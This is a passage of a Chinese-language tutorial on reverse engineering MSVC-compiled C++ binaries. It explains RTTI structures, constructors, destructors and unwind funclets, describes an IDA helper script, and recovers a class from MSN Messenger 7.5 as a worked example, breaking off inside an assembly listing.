<p>在类的内存布局中，MSVC 编译器会把一个指向 <strong><code>COL</code></strong>（Complete Object Locator，<strong>完整对象定位符</strong>）结构体的指针放在<strong>虚函数表</strong>之前。之所以叫<strong>完整对象定位符</strong>，是因为它允许编译器根据一个特定的<strong>虚函数表指针</strong>（一个类中可能有多个<strong>虚函数表指针</strong>）定位到整个对象。<strong>COL</strong>的结构定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> RTTICompleteObjectLocator</div><div class="line">&#123;</div><div class="line">    DWORD signature;  <span class="comment">// 一直为 0 ?</span></div><div class="line">    DWORD offset;       <span class="comment">// 改虚函数表在类中相对与类的起始地址的偏移量（offset of this vtable in the complete class）</span></div><div class="line">    DWORD cdOffset;   <span class="comment">// 构造函数偏移（constructor displacement offset）</span></div><div class="line">    <span class="keyword">struct</span> TypeDescriptor* pTypeDescriptor;  <span class="comment">// 整个类的类型描述符（TypeDescriptor of the complete class）</span></div><div class="line">    <span class="keyword">struct</span> RTTIClassHierarchyDescriptor* pClassDescriptor;  <span class="comment">// 类的继承关系描述结构（describes inheritance hierarchy）</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>RTTIClassHierarchyDescriptor</code> 描述整个类的继承关系，它对类的所有 <code>COL</code> 都是通用的。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> RTTIClassHierarchyDescriptor</div><div class="line">&#123;</div><div class="line">    DWORD signature;      <span class="comment">// 一直为 0 ?</span></div><div class="line">    DWORD attributes;     <span class="comment">//bit 0 set = 多重继承, bit 1 set = 虚继承</span></div><div class="line">    DWORD numBaseClasses; <span class="comment">// pBaseClassArray 中的基类数量（number of classes in pBaseClassArray）</span></div><div class="line">    <span class="keyword">struct</span> RTTIBaseClassArray* pBaseClassArray;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>Base Class Array</code> 定义了在执行 <code>_dynamic_cast_</code> 时<strong>派生类</strong>可以动态映射成的所有<strong>基类</strong>的信息，其中每一个<strong>基类描述符</strong>（Base Class Descriptor）的结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> RTTIBaseClassDescriptor</div><div class="line">&#123;</div><div class="line">    <span class="keyword">struct</span> TypeDescriptor* pTypeDescriptor; <span class="comment">// 类的类型描述符（type descriptor of the class）</span></div><div class="line">    DWORD numContainedBases; <span class="comment">// Base Class Array 中的基类数量（number of nested classes following in the Base Class Array）</span></div><div class="line">    <span class="keyword">struct</span> PMD where;        <span class="comment">// 内部成员偏移信息（pointer-to-member displacement info）</span></div><div class="line">    DWORD attributes;        <span class="comment">// 标志位, 通常置 0</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> PMD</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> mdisp;  <span class="comment">// 内部成员偏移（member displacement）</span></div><div class="line">    <span class="keyword">int</span> pdisp;  <span class="comment">// 虚函数表的偏移（vbtable displacement）</span></div><div class="line">    <span class="keyword">int</span> vdisp;  <span class="comment">// 虚函数表的内部偏移（displacement inside vbtable）</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>PMD</code> 结构描述一个<strong>基类</strong>在其<strong>派生类</strong>中的位置信息。<strong>简单继承</strong>的时候，<strong>基类</strong>相对于其<strong>派生类</strong>的<strong>偏移量</strong>是固定的，偏移量的值即 <code>_mdisp_</code> 的值；如果涉及到<strong>虚继承</strong>，就需要先从<strong>虚函数表</strong>中取出一个额外的偏移量一起计算出基类的偏移，在函数调用的时候则需要重新调整 <code>*this</code> 指针的值。整个过程的伪码示例如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//char* pThis; struct PMD pmd;</span></div><div class="line">pThis += pmd.mdisp;</div><div class="line"><span class="keyword">if</span> (pmd.pdisp != <span class="number">-1</span>)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> *vbtable = pThis + pmd.pdisp;</div><div class="line">  pThis += *(<span class="keyword">int</span>*)(vbtable + pmd.vdisp);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>举例来说，文章开头 3 个类的继承关系中 RTTI 的信息图下图所示：</p>
<p><img src="/imgs/14936061421938.jpg" alt="示例l类中的 RTTI 继承关系"></p>
<h2 id="信息提取"><a href="#信息提取" class="headerlink" title="信息提取"></a>信息提取</h2><h3 id="1-RTTI"><a href="#1-RTTI" class="headerlink" title="1) RTTI"></a>1) RTTI</h3><p>如果存在 <strong>RTTI</strong>，那么 <strong>RTTI</strong> 能为逆向工作提供很多有价值的信息。根据 <strong>RTTI</strong>，我们可能还原<strong>类名</strong>、<strong>类的继承关系</strong>，甚至有时候能还原部分类的<strong>内存布局</strong>信息。在 <strong>附录 1</strong> 中，我写了一个 <strong>RTTI 信息扫描器</strong>，可以做进一步参考。</p>
<h3 id="2-静态初始化-和-全局初始化"><a href="#2-静态初始化-和-全局初始化" class="headerlink" title="2) 静态初始化 和 全局初始化"></a>2) 静态初始化 和 全局初始化</h3><p><strong>全局</strong>和<strong>静态</strong>的对象会在 <code>main()</code> 函数前面初始化。在 MSVC++ 中，编译器会为<strong>全局</strong>和<strong>静态</strong>函数生成相应的<strong>初始化器</strong>，并把他们的地址放在一个<strong>表</strong>（<code>table</code>）中，这个<strong>表</strong>会在 <code>_cinit()</code> 初始化 <strong>CRT</strong> 的时候生成。在 <strong>PE</strong> 结构中，这个<strong>表</strong>通常在 <code>.data</code> 段的起始位置。典型的初始化器结构示例如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">_init_gA1:</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, offset _gA1</div><div class="line">    <span class="keyword">call</span>    A::A()</div><div class="line">    <span class="keyword">push</span>    offset _term_gA1</div><div class="line">    <span class="keyword">call</span>    _atexit</div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">ecx</span></div><div class="line">    <span class="keyword">retn</span></div><div class="line"><span class="symbol">_term_gA1:</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, offset _gA1</div><div class="line">    <span class="keyword">call</span>    A::~A()</div><div class="line">    <span class="keyword">retn</span></div></pre></td></tr></table></figure>
<p>这样，从上面这个表里我们可以看出：</p>
<ul>
<li><strong>全局</strong>/<strong>静态</strong>对象的地址；</li>
<li>它们的<strong>构造函数</strong></li>
<li>它们的<strong>析构函数</strong></li>
</ul>
<p>更多细节可以参考 <code>_#pragma_directive_init_seg_</code> [5]。</p>
<h3 id="3-栈展开处理函数（Unwind-Funclets）"><a href="#3-栈展开处理函数（Unwind-Funclets）" class="headerlink" title="3) 栈展开处理函数（Unwind Funclets）"></a>3) 栈展开处理函数（Unwind Funclets）</h3><p>一个函数中生成任何<strong>动态</strong>的对象时，VC++ 编译器总会生成一个相关的异常处理结构，以便在遇到异常时进行栈展开、销毁该动态对象。VC++ 中异常处理的底层细节可以参考本系列前一篇。典型的 <code>Unwind Funclets</code> 结构如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">unwind_1tobase:</span>  <span class="comment">; state 1 -&gt; -1</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+a1]</div><div class="line">    <span class="keyword">jmp</span>     A::~A()</div></pre></td></tr></table></figure>
<p>通过在函数体中寻找相反的状态变化，或者在第一次访问栈中的同一个变量，我们也可以找到其<strong>构造函数</strong>：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+a1]</div><div class="line"><span class="keyword">call</span>    A::A()</div><div class="line"><span class="keyword">mov</span>     [<span class="built_in">ebp</span>+__$EHRec$.state], <span class="number">1</span></div></pre></td></tr></table></figure>
<p>对与那些用 <code>new()</code> 方法创建的对象，<strong>栈展开处理函数</strong> 保证即使在析构函数失效的情况下，也能删除掉分配给这些对象的内存：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">unwind_0tobase:</span> <span class="comment">; state 0 -&gt; -1</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+pA1]</div><div class="line">    <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">    <span class="keyword">call</span>    operator delete(void *)</div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">ecx</span></div><div class="line">    <span class="keyword">retn</span></div></pre></td></tr></table></figure>
<p>在函数体中：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">;A* pA1 = new A();</span></div><div class="line">    <span class="keyword">push</span></div><div class="line">    <span class="keyword">call</span>    operator new(uint)</div><div class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+pA1], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+__$EHRec$.state], <span class="number">0</span><span class="comment">; state 0: memory allocated but object is not yet constructed</span></div><div class="line">    <span class="keyword">jz</span>      short @@new_failed</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">eax</span></div><div class="line">    <span class="keyword">call</span>    A::A()</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">eax</span></div><div class="line">    <span class="keyword">jmp</span>     short @@constructed_ok</div><div class="line"></div><div class="line">@@new_failed:</div><div class="line">    <span class="keyword">xor</span>     <span class="built_in">esi</span>, <span class="built_in">esi</span></div><div class="line"></div><div class="line">@@constructed_ok:</div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">14h</span>+__$EHRec$.state], -<span class="number">1</span></div><div class="line"><span class="comment">;state -1: either object was constructed successfully or memory allocation failed</span></div><div class="line"><span class="comment">;in both cases further memory management is done by the programmer</span></div></pre></td></tr></table></figure>
<p>另一种形式的 <strong>栈展开处理函数</strong> 存在于<strong>构造函数</strong> 和 <strong>析构函数</strong> 中，它将保证在程序遇到异常时销毁对象成员。这种情况下的 <strong>栈展开处理函数</strong> 使用的是保存在栈变量中的 <code>_this_</code> 指针：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">unwind_2to1:</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+_this] <span class="comment">; state 2 -&gt; 1</span></div><div class="line">    <span class="keyword">add</span>     <span class="built_in">ecx</span>, <span class="number">4Ch</span></div><div class="line">    <span class="keyword">jmp</span>     B1::~B1</div></pre></td></tr></table></figure>
<p>上面这个例子中，<strong>栈展开处理函数</strong> 销毁了 <code>B1</code> 在偏移 <code>0x4c</code> 处的成员。总的来说，通过 <strong>栈展开处理函数</strong>，我们可以获取一下信息：</p>
<ul>
<li>栈中保存的通过 <code>_operator_new_</code> 创建的 C++ 对象，或指向对象的指针；</li>
<li>类的构造函数；</li>
<li>类的析构函数；</li>
<li><code>new()</code> 创建出来的对象的 <code>size</code>。</li>
</ul>
<h3 id="4-递归构造-析构函数"><a href="#4-递归构造-析构函数" class="headerlink" title="4) 递归构造/析构函数"></a>4) 递归构造/析构函数</h3><p>这个规则很简单：<strong>递归构造函数</strong>递归地调用其他构造函数（比如基类的构造函数、其他成员的构造函数）；<strong>递归析构函数</strong> 递归地调用他们所有的析构函数。典型的<strong>构造函数</strong>具有以下功能：</p>
<ul>
<li>调用基类的构造函数；</li>
<li>调用其他嵌套对象所属类的构造函数；</li>
<li>如果类中声明了<strong>虚函数</strong>，则初始化<strong>虚函数表指针</strong>（ <code>vfptr</code> ）；</li>
<li>执行程序员定义的<strong>构造函数</strong>函数体。</li>
</ul>
<p>典型的<strong>析构函数</strong>则具有相对应的以下功能：</p>
<ul>
<li>如果类中声明了<strong>虚函数</strong>，则初始化<strong>虚函数表指针</strong>（ <code>vfptr</code> ）；</li>
<li>执行程序员定义的<strong>析构函数</strong>函数体；</li>
<li>调用其他嵌套对象所属类的析构函数</li>
<li>调用基类的析构函数。</li>
</ul>
<p>不过， MSVC 编译器创建的 <strong>析构函数</strong> 还有一个特性：<code>_state_</code> 以<strong>最大值</strong>初始化，并随着对成员对象的析构行为而递减。这样一来反而方便分析析构函数的执行。另外需要注意的是，在 MSVC 中，简单的 构造/析构函数通常是以内联形式存在的，所以经常会在同一个函数中看到<strong>虚函数表指针</strong>被不同指针重复调用。</p>
<h3 id="5-数组构造与析构"><a href="#5-数组构造与析构" class="headerlink" title="5) 数组构造与析构"></a>5) 数组构造与析构</h3><p>MSVC 用辅助函数来完成一个对象数组的构造与析构。用以下代码为例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A* pA = <span class="keyword">new</span> A[n];</div><div class="line"><span class="keyword">delete</span> [] pA;</div></pre></td></tr></table></figure>
<p>用 C++ 伪码详细还原一下，大概如下所示：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">array = new char(sizeof(A)*n+sizeof(int))</div><div class="line">if (array)</div><div class="line">&#123;</div><div class="line">  *(int*)array=n; //store array size in the beginning</div><div class="line">  'eh vector constructor iterator'(array+sizeof(int),sizeof(A),count,&amp;A::A,&amp;A::~A);</div><div class="line">&#125;</div><div class="line">pA = array;</div><div class="line"></div><div class="line">'eh vector destructor iterator'(pA,sizeof(A),count,&amp;A::~A);</div></pre></td></tr></table></figure>
<p>如果 <code>A</code> 包含虚函数，删除对象数组的时候会调用一个 <code>vector deleting destructor</code> ：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">;pA-&gt;'vector deleting destructor'(3);</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, pA</div><div class="line"><span class="keyword">push</span> <span class="number">3</span> <span class="comment">; flags: 0x2=deleting an array, 0x1=free the memory</span></div><div class="line"><span class="keyword">call</span> A::<span class="string">'vector deleting destructor'</span></div></pre></td></tr></table></figure>
<p>如果 <code>A</code> 的<strong>析构函数</strong>是个<strong>虚函数</strong>，那么析构的时候会以调用虚函数的方式调用析构函数：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, pA</div><div class="line"><span class="keyword">push</span> <span class="number">3</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ecx</span>] <span class="comment">;fetch vtable pointer</span></div><div class="line"><span class="keyword">call</span> [<span class="built_in">eax</span>]     <span class="comment">;call deleting destructor</span></div></pre></td></tr></table></figure>
<p>因此，通常来说通过构造/析构的数组迭代调用，我们可以发掘以下信息：</p>
<ul>
<li>对象数组的地址；</li>
<li>数组里各对象的构造函数；</li>
<li>数组里各对象的析构函数；</li>
<li>类的 <code>size</code>。</li>
</ul>
<h3 id="6-删除析构函数（-deleting-destructor-）"><a href="#6-删除析构函数（-deleting-destructor-）" class="headerlink" title="6) 删除析构函数（ deleting destructor ）"></a>6) 删除析构函数（ <code>deleting destructor</code> ）</h3><p>当类中含有<strong>虚析构函数</strong>（ <code>virtual destructor</code> ）时，编译器会生成一个辅助函数——<strong>删除析构函数</strong>，这样便能确保销毁一个类实例的时候合适的 <code>_operator delete_</code> 被调用。<strong>删除析构函数</strong> 的伪码如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">virtual void * A::'scalar deleting destructor'(uint flags)</div><div class="line">&#123;</div><div class="line">  this-&gt;~A();</div><div class="line">  if (flags&amp;1) A::operator delete(this);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>该函数的地址会被放在<strong>虚函数表</strong>( <code>vftable</code>) 中，并覆盖原有的析构函数地址。这样一来，如果另外一个类覆盖了这个虚析构函数，那么它的 <code>_delete_</code> 将被调用。然而实际代码中 <code>_delete_</code> 几乎不会被覆盖，所以你通常只看到调用默认的delete()。有时候，编译器也生成一个删除析构函数向量，伪码示例如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">virtual void * A::'vector deleting destructor'(uint flags)</div><div class="line">&#123;</div><div class="line">  if (flags&amp;2) //删除一个数组（destructing a vector）</div><div class="line">  &#123;</div><div class="line">    array = ((int*)this)-1; //数组大小存于此指针前面（array size is stored just before the this pointer）</div><div class="line">    count = array[0];</div><div class="line">    'eh vector destructor iterator'(this,sizeof(A),count,A::~A);</div><div class="line">    if (flags&amp;1) A::operator delete(array);</div><div class="line">  &#125;</div><div class="line">  else &#123;</div><div class="line">    this-&gt;~A();</div><div class="line">    if (flags&amp;1) A::operator delete(this);</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>我忽略了大部分涉及虚基类的类的实现细节，因为它们是在太复杂，而且在现实生活中很少用到。请参考 Jan Gray 的文章[1]，它非常相近（请忽略那看着脑仁疼的匈牙利命名法）。文章[2]描述了一个MSVC实现虚继承的实现。更多细节还可以看 MS 专利[3]。</p>
<h2 id="附录-1：-ms-rtti4-idc"><a href="#附录-1：-ms-rtti4-idc" class="headerlink" title="附录 1： ms_rtti4.idc"></a>附录 1： <code>ms_rtti4.idc</code></h2><p>这是我为解析 <strong>RTTI</strong> 和<strong>虚函数表</strong>写的一个 IDA 脚本，读者可以从 <a href="http://www.openrce.org/downloads/details/196" target="_blank" rel="external"> Microsoft VC++ Reversing Helpers</a> 下载到该脚本以及本系列两篇文章。该脚本的功能特性有以下几个：</p>
<ul>
<li>解析 <strong>RTTI</strong> 结构、用相应的类名重命名<strong>虚函数表</strong>；</li>
<li>在相对简单的分析工作中重命名<strong>构造函数</strong>与<strong>析构函数</strong>；</li>
<li>把所有的<strong>虚函数表</strong>以及<strong>引用函数</strong>和类的继承关系输出到文件中。</li>
</ul>
<blockquote>
<p><strong>Usage</strong>：<br>IDA 的初始化分析结束之后，载入 <code>ms_rtti4.idc</code> ，它会询问你是否要扫描 PE 文件中的<strong>虚函数表</strong>（vftables)。需要注意的是，这个过程可能需要比较长的时间。如果你选择跳过扫描，后续仍然可以手动解析<strong>虚函数表</strong>。如果你选择让脚本帮你执行扫描，脚本会识别 PE 文件中所有使用 <strong>RTTI</strong> 的<strong>虚函数表</strong>，并且会重命名<strong>虚函数表</strong>、识别和重命名构造/析构函数。也有可能脚本会解析失败，尤其是涉及到<strong>虚继承</strong>的情况。扫描结束后，脚本会自动打开存放扫描结果的文件。</p>
</blockquote>
<p>另外，脚本载入以后，可以使用以下 <strong>快捷键</strong> 来对 MSVC 生成的结构进行手动解析：</p>
<ul>
<li><strong><code>Alt+F8</code></strong>：解析一个<strong>虚函数表。游标应该会停在虚函数表的起始位置。如果里面用到了 </strong>RTTI<strong>，脚本会使用里面的类名来重命名虚函数表。如果没有涉及到 </strong>RTTI<strong>，你可以手动输入类名来自定义。如果脚本扫描到了</strong>虚析构函数**，一样也会把它重命名。</li>
<li><p><strong><code>Alt+F7</code></strong>：解析 <code>FuncInfo</code> 结构。<code>FuncInfo</code> 是一个描述在栈上创建对象或使用异常处理句柄的函数信息的结构。它的地址在异常处理句柄中通常被解析为 <code>_CxxFrameHandler</code> ：</p>
  <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, offset FuncInfo1</div><div class="line"><span class="keyword">jmp</span> _CxxFrameHandler</div></pre></td></tr></table></figure>
<p>  多数情况下它会被 IDA 直接识别并解析，但是我提供的脚本可以解析出更多的信息，你可以用 <code>ms_ehseh.idc</code> 解析文件中的所有 <code>FuncInfo</code> 。<br>  游标放到 <code>FuncInfo</code> 起始位置的，此快捷键有效。</p>
</li>
<li><p><strong><code>Alt+F9</code></strong>：解析 <code>throw</code> 信息。<code>Throw info</code> 是 <code>_CxxThrowException</code> 在实现 <code>_throw</code> 操作符时用到的辅助结构，它通常作为 <code>_CxxThrowException</code> 的第二个参数被调用：</p>
  <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+e]</div><div class="line"><span class="keyword">call</span>    E::E()</div><div class="line"><span class="keyword">push</span>    offset ThrowInfo_E</div><div class="line"><span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+e]</div><div class="line"><span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line"><span class="keyword">call</span>    _CxxThrowException</div></pre></td></tr></table></figure>
<p>  游标放在 <code>throw info</code> 起始位置的时候次快捷键才有效。该脚本会解析 <code>throw info</code> 并为调用 <code>throw</code> 操作符的类添加注释。它还可以识别和重命名异常的析构函数和拷贝构造函数。</p>
</li>
</ul>
<h2 id="附录-2：实战恢复一个类的结构"><a href="#附录-2：实战恢复一个类的结构" class="headerlink" title="附录 2：实战恢复一个类的结构"></a>附录 2：实战恢复一个类的结构</h2><p>我们练手的对象是 <code>MSN Messenger 7.5</code> （ <code>msnmsgr.exe</code>  版本是 <code>7.5.324.0</code> , 大小 7094272 Bytes ），它主要由 C++ 实现，并且里面用到了很多 <strong>RTTI</strong> 的结构，正符合我们的需求。先看一下位于 <code>.0040EFD8</code> 和 <code>.0040EFE0</code> 的两处<strong>虚函数表</strong>。其中完整的 RTTI 结构及其继承关系如下所示：<br><img src="/imgs/14938199737802.jpg" alt="RTTI hierarchy for MSN Messenger 7.5"></p>
<p>这样一来，就有了两个<strong>虚函数表</strong>属于同一个<strong>类</strong> —— <code>CContentMenuItem</code> ，再看它们的<strong>基类描述符</strong>我们可以发现：</p>
<ul>
<li><code>CContentMenuItem</code> 里面包含 3 个<strong>基类</strong> —— <code>CDownloader</code>/<code>CNativeEventSink</code>/<code>CNativeEventSource</code>;</li>
<li><code>CDownloader</code> 包含 1 个<strong>基类</strong> —— <code>CNativeEventSink</code>；</li>
<li>因此 <code>CContentMenuItem</code> 继承自 <code>CDownloader</code> 和 <code>CNativeEventSource</code>，而 <code>CDownloader</code> 继承自 <code>CNativeEventSink</code>；</li>
<li><code>CDownloader</code> 位于整个对象的起始位置，<code>CNativeEventSource</code> 则位于偏移为 <code>0x24</code> 的位置。</li>
</ul>
<p><img src="/imgs/14938205753585.jpg" alt=""></p>
<p>据此，我们可以得出这么一个结论：第一个<strong>虚函数表</strong>列出了 <code>CNativeEventSource</code> 里的方法，第二个<strong>虚函数表</strong>列出了 <code>CDownloader</code> 或者 <code>CNativeEventSink</code> 里的方法（如果这两者都不是，<code>CContentMenuItem</code> 会重用 <code>CNativeEventSource</code> 的<strong>虚函数表</strong>）。我们再来看都有谁引用了这两个<strong>虚函数表</strong>，它们<strong>都</strong>被位于 <code>.052B5E0</code> 和 <code>.052B547</code> 的两个函数引用（这样进一步印证了它们属于同一个<strong>类</strong>）。如果我们仔细查看 <code>.052B547</code> 处函数的开头，可以发现 <code>_state_</code> 被初始化为 <code>6</code>，这表明该函数是一个 <strong>析构函数</strong>；由于一个类只能有 1 个析构函数，我们可以推断 <code>.052B5E0</code> 处的函数是一个<strong>构造函数</strong>：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">CContentMenuItem:</span>:CContentMenuItem   proc <span class="built_in">near</span></div><div class="line">this = <span class="built_in">esi</span></div><div class="line">    <span class="keyword">push</span>    this</div><div class="line">    <span class="keyword">push</span>    <span class="built_in">edi</span></div><div class="line">    <span class="keyword">mov</span>     this, <span class="built_in">ecx</span></div><div class="line">    <span class="keyword">call</span>    sub_4CA77A</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">edi</span>, [this+<span class="number">24h</span>]</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">edi</span></div><div class="line">    <span class="keyword">call</span>    sub_4CBFDB</div><div class="line">    <span class="keyword">or</span>      <span class="built_in">dword</span> <span class="built_in">ptr</span> [this+<span class="number">48h</span>], <span class="number">0FFFFFFFFh</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+<span class="number">4Ch</span>]</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [this], offset const CContentMenuItem::<span class="string">'vftable'</span>&#123;for <span class="string">'CContentMenuItem'</span>&#125;</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>], offset const CContentMenuItem::<span class="string">'vftable'</span>&#123;for <span class="string">'CNativeEventSource'</span>&#125;</div><div class="line">    <span class="keyword">call</span>    sub_4D8000</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+<span class="number">50h</span>]</div><div class="line">    <span class="keyword">call</span>    sub_4D8000</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+<span class="number">54h</span>]</div><div class="line">    <span class="keyword">call</span>    sub_4D8000</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+<span class="number">58h</span>]</div><div class="line">    <span class="keyword">call</span>    sub_4D8000</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+<span class="number">5Ch</span>]</div><div class="line">    <span class="keyword">call</span>    sub_4D8000</div><div class="line">    <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     [this+<span class="number">64h</span>], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     [this+<span class="number">68h</span>], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     [this+<span class="number">6Ch</span>], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">edi</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [this+<span class="number">60h</span>], offset const CEventSinkList::<span class="string">'vftable'</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, this</div><div class="line">    <span class="keyword">pop</span>     this</div><div class="line">    <span class="keyword">retn</span></div><div class="line">sub_52B5E0      